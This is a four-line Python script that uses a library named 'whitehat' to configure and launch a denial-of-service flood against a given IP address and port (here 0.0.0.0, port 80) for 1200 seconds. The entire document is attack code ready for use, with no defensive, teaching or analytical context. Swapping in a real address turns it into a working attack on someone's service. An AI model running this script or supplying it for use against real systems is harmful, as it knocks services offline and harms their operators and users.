import whitehat

ddos = whitehat.ddos_target("0.0.0.0", 80, 1200)  #IP, PORT, DURATION
whitehat.start_ddos(ddos)
